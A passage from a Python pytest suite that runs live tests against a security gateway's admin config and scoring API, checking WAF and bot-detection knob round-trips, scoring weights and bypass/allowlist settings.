        # Restore to default
        _with_admin(_SNS + "/config", method="POST",
                    body=b'{"RISK_BAN_THRESHOLD": 50}',
                    extra_headers={"Content-Type": "application/json"})


@_skip_no_gw
class TestAFScoringEndpoint:
    """Scoring / Defense-and-scoring endpoint content validation."""

    def test_af01_scoring_endpoint_returns_json(self):
        """GET /scoring must return valid JSON with weights."""
        s, _, b = _with_admin(_SNS + "/scoring")
        if s != 200:
            pytest.skip(f"Scoring endpoint {s}")
        data = json.loads(b)
        assert "weights" in data, "No 'weights' key in scoring response"
        assert isinstance(data["weights"], list), "'weights' is not a list"

    def test_af02_redirect_maze_bot_not_in_weights(self):
        """redirect-maze-bot must be absent from weights (feature removed)."""
        s, _, b = _with_admin(_SNS + "/scoring")
        if s != 200:
            pytest.skip(f"Scoring {s}")
        try:
            data = json.loads(b)
        except json.JSONDecodeError:
            pytest.skip("Non-JSON scoring response")
        signals = [w.get("signal") for w in data.get("weights", [])]
        assert "redirect-maze-bot" not in signals, \
            "redirect-maze-bot still present in scoring weights after removal"

    def test_af03_weights_all_have_required_fields(self):
        """Every weight entry must have signal, weight, tier, toggle."""
        s, _, b = _with_admin(_SNS + "/scoring")
        if s != 200:
            pytest.skip(f"Scoring {s}")
        try:
            data = json.loads(b)
        except json.JSONDecodeError:
            pytest.skip("Non-JSON")
        for w in data.get("weights", []):
            for field in ("signal", "weight", "tier"):
                assert field in w, f"Weight entry missing '{field}': {w}"

    def test_af04_no_unknown_tier_in_weights(self):
        """No weight entry should have tier '?' (indicates missing DESCRIPTIONS entry)."""
        s, _, b = _with_admin(_SNS + "/scoring")
        if s != 200:
            pytest.skip(f"Scoring {s}")
        try:
            data = json.loads(b)
        except json.JSONDecodeError:
            pytest.skip("Non-JSON")
        unknown = [w["signal"] for w in data.get("weights", []) if w.get("tier") == "?"]
        assert not unknown, \
            f"Signals with unknown tier '?': {unknown} — add to DESCRIPTIONS dict"

    def test_af05_honey_cred_in_weights(self):
        """honey-cred must be present in scoring weights."""
        s, _, b = _with_admin(_SNS + "/scoring")
        if s != 200:
            pytest.skip(f"Scoring {s}")
        try:
            data = json.loads(b)
        except json.JSONDecodeError:
            pytest.skip("Non-JSON")
        signals = [w.get("signal") for w in data.get("weights", [])]
        assert "honey-cred" in signals, "honey-cred missing from scoring weights"

    def test_af06_redirect_maze_enabled_in_config(self):
        """REDIRECT_MAZE_ENABLED must be present in hot-reload config state (active feature)."""
        s, _, b = _with_admin(_SNS + "/config")
        if s != 200:
            pytest.skip(f"Config {s}")
        try:
            data = json.loads(b)
        except json.JSONDecodeError:
            pytest.skip("Non-JSON")
        state = data.get("state", data)
        assert "REDIRECT_MAZE_ENABLED" in state, \
            "REDIRECT_MAZE_ENABLED missing from config state — check _HOT_RELOAD_KNOBS"


# ── U: 1.8.9 dynamic knob toggle ─────────────────────────────────────────────

@_skip_no_gw
class TestKnobDynamic:
    """U01–U12: 1.8.9 kill-switch knobs toggled via live controls API.

    Pattern per test:
      1. Read current knob value from /secured/config  (must be True by default)
      2. POST False → verify /secured/config reflects False
      3. POST True  → verify /secured/config reflects True (restore)

    Knobs that require live traffic to observe side-effects are verified via
    scoring weights presence — if the knob off/on is reflected in SIGNAL_KNOB
    the toggle plumbing is correct.  Behavioural probes (send a request that
    would trigger the detector, confirm it is/isn't scored) are added for
    knobs whose effect is observable from the outside without triggering bans.
    """

    # ── helpers ──────────────────────────────────────────────────────────────

    @staticmethod
    def _config_state():
        """Fetch /secured/config, return (status, state_dict)."""
        s, _, b = _with_admin(_SNS + "/config")
        if s != 200:
            return s, {}
        try:
            data = json.loads(b)
        except json.JSONDecodeError:
            return s, {}
        return s, data.get("state", data)

    @staticmethod
    def _csrf_token():
        """Return the agw_csrf value captured at login — this IS the X-CSRF-Token."""
        _, csrf = _admin_login_cookies()
        return csrf

    @classmethod
    def _set_knob(cls, knob_name, value):
        """POST a single knob value to /secured/config with CSRF token. Returns HTTP status."""
        csrf = cls._csrf_token()
        extra = {"Content-Type": "application/json"}
        if csrf:
            extra["X-CSRF-Token"] = csrf
            # Also include the agw_csrf cookie alongside agw_session
            sc = _admin_session_cookie()
            session_kv = sc.split(";")[0].strip() if sc else ""
            full_cookie = f"{session_kv}; agw_csrf={csrf}" if session_kv else f"agw_csrf={csrf}"
            # Override Cookie header by calling _req directly
            hdrs = {"Cookie": full_cookie, "Content-Type": "application/json",
                    "X-CSRF-Token": csrf,
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/124.0"}
            s, _, _ = _req(_SNS + "/config", method="POST",
                           headers=hdrs, body=json.dumps({knob_name: value}))
            return s
        s, _, _ = _with_admin(
            _SNS + "/config", method="POST",
            body=json.dumps({knob_name: value}),
            extra_headers=extra,
        )
        return s

    @classmethod
    def _toggle_round_trip(cls, knob_name):
        """Assert knob is on by default, toggle off, toggle on, return states tuple."""
        s, state = cls._config_state()
        if s != 200:
            pytest.skip(f"Config API {s}")
        initial = state.get(knob_name)
        # default must be truthy
        assert initial, (
            f"{knob_name}: expected default True in config state, got {initial!r}")

        # toggle off
        ps = cls._set_knob(knob_name, False)
        assert ps in (200, 204), f"{knob_name}: POST False returned {ps}"
        _, state2 = cls._config_state()
        assert state2.get(knob_name) is False, (
            f"{knob_name}: expected False after toggle-off, got {state2.get(knob_name)!r}")

        # restore on
        ps2 = cls._set_knob(knob_name, True)
        assert ps2 in (200, 204), f"{knob_name}: POST True returned {ps2}"
        _, state3 = cls._config_state()
        assert state3.get(knob_name) is True, (
            f"{knob_name}: expected True after restore, got {state3.get(knob_name)!r}")

    # ── U01–U08: round-trip for representative 1.8.9 knobs ───────────────────

    def test_u01_waf_body_enabled_round_trip(self):
        """U01 — WAF_BODY_ENABLED hot-toggle round-trip."""
        self._toggle_round_trip("WAF_BODY_ENABLED")

    def test_u02_waf_smuggling_enabled_round_trip(self):
        """U02 — WAF_SMUGGLING_ENABLED hot-toggle round-trip."""
        self._toggle_round_trip("WAF_SMUGGLING_ENABLED")

    def test_u03_waf_verb_override_enabled_round_trip(self):
        """U03 — WAF_VERB_OVERRIDE_ENABLED hot-toggle round-trip."""
        self._toggle_round_trip("WAF_VERB_OVERRIDE_ENABLED")

    def test_u04_waf_header_injection_enabled_round_trip(self):
        """U04 — WAF_HEADER_INJECTION_ENABLED hot-toggle round-trip."""
        self._toggle_round_trip("WAF_HEADER_INJECTION_ENABLED")

    def test_u05_waf_graphql_enabled_round_trip(self):
        """U05 — WAF_GRAPHQL_ENABLED hot-toggle round-trip."""
        self._toggle_round_trip("WAF_GRAPHQL_ENABLED")

    def test_u06_rate_limit_enabled_round_trip(self):
        """U06 — RATE_LIMIT_ENABLED hot-toggle round-trip."""
        self._toggle_round_trip("RATE_LIMIT_ENABLED")

    def test_u07_session_churn_enabled_round_trip(self):
        """U07 — SESSION_CHURN_ENABLED hot-toggle round-trip."""
        self._toggle_round_trip("SESSION_CHURN_ENABLED")

    def test_u08_host_blocking_enabled_round_trip(self):
        """U08 — HOST_BLOCKING_ENABLED hot-toggle round-trip."""
        self._toggle_round_trip("HOST_BLOCKING_ENABLED")

    # ── U09–U12: scoring endpoint reflects toggle ─────────────────────────────

    def _signal_in_scoring(self, signal_name):
        """Return True if signal_name appears in live /scoring weights."""
        s, _, b = _with_admin(_SNS + "/scoring")
        if s != 200:
            pytest.skip(f"Scoring API {s}")
        try:
            data = json.loads(b)
        except json.JSONDecodeError:
            pytest.skip("Non-JSON scoring response")
        signals = [w.get("signal") for w in data.get("weights", [])]
        return signal_name in signals

    def test_u09_all_189_knobs_present_in_config_state(self):
        """U09 — all 29 new 1.8.9 knobs visible in /secured/config state."""
        _new_knobs = [
            "WAF_BODY_ENABLED", "WAF_SMUGGLING_ENABLED", "WAF_VERB_OVERRIDE_ENABLED",
            "WAF_HEADER_INJECTION_ENABLED", "WAF_GRAPHQL_ENABLED", "WAF_UPLOAD_ENABLED",
            "WAF_SLOWLORIS_ENABLED", "ACCEPT_WILDCARD_CHECK_ENABLED", "SESSION_CHURN_ENABLED",
            "JA4H_DENY_ENABLED", "HOST_BLOCKING_ENABLED", "REQUIRED_HEADERS_ENABLED",
            "JA4_REQUIRED_ENABLED", "UPSTREAM_AUTH_FAIL_ENABLED", "RATE_LIMIT_IP_ENABLED",
            "RATE_LIMIT_ENABLED", "FP_BAN_CHECK_ENABLED", "TRAFFIC_THRESHOLD_ENABLED",
            "TLS_FP_BLOCK_ENABLED", "JWT_VALIDATION_ENABLED", "CUSTOM_RULES_ENABLED",
            "ENDPOINT_RATE_LIMIT_ENABLED", "HONEY_CRED_ENABLED", "CANARY_PROBE_ENABLED",
            "LLM_HEURISTIC_ENABLED", "AUTOMATION_PROBE_ENABLED", "INTERACTION_PROBE_ENABLED",
            "COORDINATED_ATTACK_ENABLED", "JOURNEY_CHECK_ENABLED",
        ]
        s, state = self._config_state()
        if s != 200:
            pytest.skip(f"Config API {s}")
        missing = [k for k in _new_knobs if k not in state]
        assert not missing, (
            f"1.8.9 knobs not exposed by /secured/config: {missing}")

    def test_u10_all_189_knobs_default_true_in_live_config(self):
        """U10 — all 29 new 1.8.9 knobs are True (enabled) in the live gateway config."""
        _new_knobs = [
            "WAF_BODY_ENABLED", "WAF_SMUGGLING_ENABLED", "WAF_VERB_OVERRIDE_ENABLED",
            "WAF_HEADER_INJECTION_ENABLED", "WAF_GRAPHQL_ENABLED", "WAF_UPLOAD_ENABLED",
            "WAF_SLOWLORIS_ENABLED", "ACCEPT_WILDCARD_CHECK_ENABLED", "SESSION_CHURN_ENABLED",
            "JA4H_DENY_ENABLED", "HOST_BLOCKING_ENABLED", "REQUIRED_HEADERS_ENABLED",
            "JA4_REQUIRED_ENABLED", "UPSTREAM_AUTH_FAIL_ENABLED", "RATE_LIMIT_IP_ENABLED",
            "RATE_LIMIT_ENABLED", "FP_BAN_CHECK_ENABLED", "TRAFFIC_THRESHOLD_ENABLED",
            "TLS_FP_BLOCK_ENABLED", "JWT_VALIDATION_ENABLED", "CUSTOM_RULES_ENABLED",
            "ENDPOINT_RATE_LIMIT_ENABLED", "HONEY_CRED_ENABLED", "CANARY_PROBE_ENABLED",
            "LLM_HEURISTIC_ENABLED", "AUTOMATION_PROBE_ENABLED", "INTERACTION_PROBE_ENABLED",
            "COORDINATED_ATTACK_ENABLED", "JOURNEY_CHECK_ENABLED",
        ]
        s, state = self._config_state()
        if s != 200:
            pytest.skip(f"Config API {s}")
        wrong = {k: state[k] for k in _new_knobs if k in state and not state[k]}
        assert not wrong, (
            f"1.8.9 knobs not defaulting to True in live config: {wrong}")

    def test_u11_waf_smuggling_signals_in_scoring_weights(self):
        """U11 — smuggling signals appear in scoring weights (WAF_SMUGGLING_ENABLED=True)."""
        # smuggling-dual-header appears in RISK_WEIGHTS; smuggling-cl-te is a hard-block only
        assert self._signal_in_scoring("smuggling-dual-header"), (
            "smuggling-dual-header not in scoring weights — check WAF_SMUGGLING_ENABLED plumbing")

    def test_u12_waf_body_signals_in_scoring_weights(self):
        """U12 — body signals appear in scoring weights (WAF_BODY_ENABLED=True)."""
        assert self._signal_in_scoring("body-critical-injection"), (
            "body-critical-injection not in scoring weights — check WAF_BODY_ENABLED plumbing")


# ─────────────────────────────────────────────────────────────────────────────
# AG — Bypass & Allowlists: dynamic live-GW tests (1.8.10)
# ─────────────────────────────────────────────────────────────────────────────

@_skip_no_gw
class TestAGBypassAllowlistsKnobs:
    """Live validation that all five Bypass & Allowlists knobs are hot-reloadable
    and behave correctly via the admin config API."""

    def _config_get(self):
        s, _, b = _with_admin(_SNS + "/config")
        if s != 200:
            pytest.skip(f"Config GET returned {s}")
        try:
            return json.loads(b).get("state", json.loads(b))
        except json.JSONDecodeError:
            pytest.skip("Non-JSON config response")

    def _config_post(self, payload):
        s, _, b = _with_admin(
            _SNS + "/config", method="POST",
            body=json.dumps(payload).encode(),
            extra_headers={"Content-Type": "application/json"},
        )
        return s, b

    # ── BYPASS_MODE ───────────────────────────────────────────────────────────

    def test_ag01_bypass_mode_present_in_config(self):
        """BYPASS_MODE must appear in /config state."""
        state = self._config_get()
        assert "BYPASS_MODE" in state, (
            "BYPASS_MODE not in config state — knob not hot-reloadable"
        )

    def test_ag02_bypass_mode_is_bool(self):
        """BYPASS_MODE config value must be a boolean."""
        state = self._config_get()
        val = state.get("BYPASS_MODE")
        assert isinstance(val, bool), f"BYPASS_MODE must be bool, got {type(val)}"

    def test_ag03_bypass_mode_default_false(self):
        """BYPASS_MODE must default to False (never on at startup)."""
        state = self._config_get()
        # We can only assert this if no one has turned it on
        val = state.get("BYPASS_MODE")
        assert val is False, (
            "BYPASS_MODE is True on live gateway — someone left bypass mode on. "
            "Turn it off before running this test."
        )

    def test_ag04_bypass_mode_toggle_round_trip(self):
        """POST BYPASS_MODE=True then =False; config must reflect each state."""
        # Turn on
        s, b = self._config_post({"BYPASS_MODE": True})
        assert s == 200, f"POST BYPASS_MODE=True failed: {s} {b[:200]}"
        try:
            data = json.loads(b)
            assert "BYPASS_MODE" in data.get("applied", {}), (
                "BYPASS_MODE not in 'applied' after enabling"
            )
            assert data["applied"]["BYPASS_MODE"] is True
            # Verify config reflects it
            state = self._config_get()
            assert state.get("BYPASS_MODE") is True, "Config not updated after enabling BYPASS_MODE"
        finally:
            # Always restore — must not leave bypass on
            self._config_post({"BYPASS_MODE": False})
            state = self._config_get()
            assert state.get("BYPASS_MODE") is False, "Failed to restore BYPASS_MODE=False"

    def test_ag05_bypass_mode_not_persisted(self):
        """BYPASS_MODE must be in _NOT_PERSIST_KNOBS (static check via scoring endpoint)."""
        s, _, b = _with_admin(_SNS + "/config")
        if s != 200:
            pytest.skip(f"Config {s}")
        try:
            data = json.loads(b)
        except json.JSONDecodeError:
            pytest.skip("Non-JSON")
        not_persist = data.get("not_persist_knobs", data.get("not_persist", []))
        if not not_persist:
            pytest.skip("not_persist_knobs not exposed in config response")
        assert "BYPASS_MODE" in not_persist, (
            "BYPASS_MODE must be in not_persist_knobs — it must reset on restart"
        )

    # ── BOT_DETECTION_ENABLED ─────────────────────────────────────────────────

    def test_ag06_bot_detection_enabled_in_config(self):
        """BOT_DETECTION_ENABLED must appear in /config state (hot-reloadable)."""
        state = self._config_get()
        assert "BOT_DETECTION_ENABLED" in state, (
            "BOT_DETECTION_ENABLED not in config state — not hot-reloadable globally"
        )

    def test_ag07_bot_detection_enabled_default_true(self):
        """BOT_DETECTION_ENABLED must default to True."""
        state = self._config_get()
        assert state.get("BOT_DETECTION_ENABLED") is True, (
            "BOT_DETECTION_ENABLED is not True — bot detection is disabled on live gateway"
        )

    def test_ag08_bot_detection_enabled_toggle_round_trip(self):
        """POST BOT_DETECTION_ENABLED=False then =True; verify both states."""
        s, b = self._config_post({"BOT_DETECTION_ENABLED": False})
        assert s == 200, f"POST BOT_DETECTION_ENABLED=False failed: {s}"
        try:
            data = json.loads(b)
            assert "BOT_DETECTION_ENABLED" in data.get("applied", {}), (
                "BOT_DETECTION_ENABLED not in 'applied'"
            )
            state = self._config_get()
            assert state.get("BOT_DETECTION_ENABLED") is False
        finally:
            self._config_post({"BOT_DETECTION_ENABLED": True})
            state = self._config_get()
            assert state.get("BOT_DETECTION_ENABLED") is True, (
                "Failed to restore BOT_DETECTION_ENABLED=True"
            )

    # ── BYPASS_PATHS ──────────────────────────────────────────────────────────

    def test_ag09_bypass_paths_in_config(self):
        """BYPASS_PATHS must appear in /config state."""
        state = self._config_get()
        assert "BYPASS_PATHS" in state, "BYPASS_PATHS not in config state"

    def test_ag10_bypass_paths_is_list(self):
        """BYPASS_PATHS config value must be a list."""
        state = self._config_get()
        assert isinstance(state.get("BYPASS_PATHS"), list), (
            f"BYPASS_PATHS must be list, got {type(state.get('BYPASS_PATHS'))}"
        )

    def test_ag11_bypass_paths_hot_reload(self):
        """POST BYPASS_PATHS=['/test-bypass-qa/'] adds the path; restore removes it."""
        original = self._config_get().get("BYPASS_PATHS", [])
        test_path = "/test-bypass-qa-live/"
        s, b = self._config_post({"BYPASS_PATHS": [test_path]})
        assert s == 200, f"POST BYPASS_PATHS failed: {s}"
        try:
            state = self._config_get()
            assert test_path in state.get("BYPASS_PATHS", []), (
                f"{test_path} not reflected in config after hot-reload"
            )
        finally:
            self._config_post({"BYPASS_PATHS": original})

    # ── JS_CHAL_OPEN_PATHS ────────────────────────────────────────────────────

    def test_ag12_js_chal_open_paths_in_config(self):
        """JS_CHAL_OPEN_PATHS must appear in /config state."""
        state = self._config_get()
        assert "JS_CHAL_OPEN_PATHS" in state, "JS_CHAL_OPEN_PATHS not in config state"

    def test_ag13_js_chal_open_paths_is_list(self):
        """JS_CHAL_OPEN_PATHS config value must be a list."""
        state = self._config_get()
        assert isinstance(state.get("JS_CHAL_OPEN_PATHS"), list), (
            f"JS_CHAL_OPEN_PATHS must be list, got {type(state.get('JS_CHAL_OPEN_PATHS'))}"
        )

    # ── AUTHORIZED_BOT_UAS ────────────────────────────────────────────────────

    def test_ag14_authorized_bot_uas_in_config(self):
        """AUTHORIZED_BOT_UAS must appear in /config state."""
        state = self._config_get()
        assert "AUTHORIZED_BOT_UAS" in state, "AUTHORIZED_BOT_UAS not in config state"

    def test_ag15_authorized_bot_uas_is_list(self):
        """AUTHORIZED_BOT_UAS config value must be a list."""
        state = self._config_get()
        assert isinstance(state.get("AUTHORIZED_BOT_UAS"), list), (
            f"AUTHORIZED_BOT_UAS must be list, got {type(state.get('AUTHORIZED_BOT_UAS'))}"
        )

    def test_ag16_authorized_bot_uas_entries_have_required_fields(self):
        """Every entry in AUTHORIZED_BOT_UAS must have name, ua, path, action."""
        state = self._config_get()
        for entry in state.get("AUTHORIZED_BOT_UAS", []):
            if not isinstance(entry, dict):
                continue
            for field in ("name", "ua", "path", "action"):
                assert field in entry, (
                    f"AUTHORIZED_BOT_UAS entry missing required field '{field}': {entry}"
                )
            valid_actions = {"authorized-robot", "allow", "ban", "really-ban"}
            assert entry["action"] in valid_actions, (
                f"AUTHORIZED_BOT_UAS entry has invalid action {entry['action']!r}: {entry}"
            )


# ── Runner ────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import subprocess, sys
    if not _BASE:
        print("Set LIVE_GW_URL and LIVE_GW_KEY env vars before running.")
        sys.exit(1)
    subprocess.run([sys.executable, "-m", "pytest", __file__, "-v", "--tb=short"], check=False)
